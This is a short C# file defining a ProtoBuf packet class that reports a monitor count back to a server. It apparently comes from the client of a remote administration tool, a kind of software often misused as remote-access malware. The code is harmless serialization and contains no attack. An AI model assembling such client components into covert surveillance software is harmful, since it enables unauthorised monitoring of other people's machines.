using ProtoBuf;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class MonitorsResponse : IPacket
    {
        public MonitorsResponse()
        {
        }

        public MonitorsResponse(int number)
        {
            Number = number;
        }

        [ProtoMember(1)]
        public int Number { get; set; }

        public void Execute(Client client)
        {
            client.Send<MonitorsResponse>(this);
        }
    }
}